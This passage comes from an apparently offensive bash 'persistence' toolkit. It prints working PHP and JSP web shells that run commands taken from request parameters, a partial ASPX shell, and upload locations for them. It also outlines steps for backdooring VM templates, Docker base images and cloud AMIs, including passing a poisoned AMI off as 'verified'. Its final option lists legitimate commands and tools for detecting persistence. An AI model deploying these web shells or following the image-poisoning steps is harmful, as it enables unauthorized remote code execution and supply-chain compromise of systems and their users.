            echo ""
            echo -e "${YELLOW}[*]${RESET} Generating web shell..."
            echo ""
            
            case $SHELL_TYPE in
                1)
                    echo -e "${GREEN}[+]${RESET} PHP Web Shell:"
                    cat << 'PHPSHELL'
<?php
if(isset($_REQUEST['p']) && md5($_REQUEST['p'])==='PASSWORD_HASH') {
    if(isset($_REQUEST['c'])) {
        echo '<pre>'.shell_exec($_REQUEST['c']).'</pre>';
    }
}
?>
PHPSHELL
                    ;;
                2)
                    echo -e "${GREEN}[+]${RESET} ASPX Web Shell:"
                    echo "<%@ Page Language=\"C#\" %>"
                    echo "<script runat=\"server\">"
                    echo "void Page_Load() { if(Request[\"p\"]==\"pass\") Response.Write(Process.Start(...)); }"
                    echo "</script>"
                    ;;
                3)
                    echo -e "${GREEN}[+]${RESET} JSP Web Shell:"
                    echo "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>"
                    ;;
            esac
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Upload locations:"
            echo "  - Web root directory"
            echo "  - Upload folders"
            echo "  - Plugin directories"
            echo "  - Theme directories"
        fi
        ;;
    
    19) # Golden Image
        echo -e "${CYAN}[*]${RESET} Golden Image Persistence"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Template poisoning..."
            echo ""
            
            echo -e "${GREEN}[+]${RESET} VM Template Poisoning:"
            echo "  1. Access vSphere/Hyper-V template"
            echo "  2. Add persistence mechanism"
            echo "  3. Every new VM gets backdoor"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Container Image Poisoning:"
            echo "  1. Access Docker registry"
            echo "  2. Modify base images"
            echo "  3. Every container gets backdoor"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Cloud AMI Poisoning:"
            echo "  1. Access cloud image repository"
            echo "  2. Create backdoored AMI"
            echo "  3. Mark as 'verified' or 'official'"
        fi
        ;;
    
    20) # Cleanup
        echo -e "${CYAN}[*]${RESET} Persistence Cleanup/Detection"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Persistence detection commands..."
            echo ""
            
            echo -e "${GREEN}━━━ Linux ━━━${RESET}"
            echo "  crontab -l                           # User cron"
            echo "  cat /etc/crontab                     # System cron"
            echo "  ls -la /etc/cron.*                   # Cron directories"
            echo "  systemctl list-unit-files --type=service"
            echo "  cat ~/.bashrc ~/.bash_profile        # Shell profiles"
            echo "  cat ~/.ssh/authorized_keys           # SSH keys"
            echo "  cat /etc/ld.so.preload               # Preload libs"
            echo ""
            
            echo -e "${GREEN}━━━ Windows ━━━${RESET}"
            echo "  reg query HKLM\\...\\Run              # Registry run keys"
            echo "  schtasks /Query                       # Scheduled tasks"
            echo "  dir %APPDATA%\\...\\Startup           # Startup folder"
            echo "  Get-WmiObject -Class __FilterToConsumerBinding  # WMI"
            echo "  Autoruns.exe                          # Sysinternals"
            echo ""
            
            echo -e "${GREEN}[+]${RESET} Tools:"
            echo "  - Autoruns (Windows)"
            echo "  - chkrootkit (Linux)"
            echo "  - rkhunter (Linux)"
            echo "  - OSSEC"
        fi
        ;;
    
    *) echo -e "${RED}[!] Invalid option${RESET}" ;;
esac

echo ""
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${RED}█${RESET}  ${WHITE}PERSISTENCE OPERATION COMPLETE${RESET}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
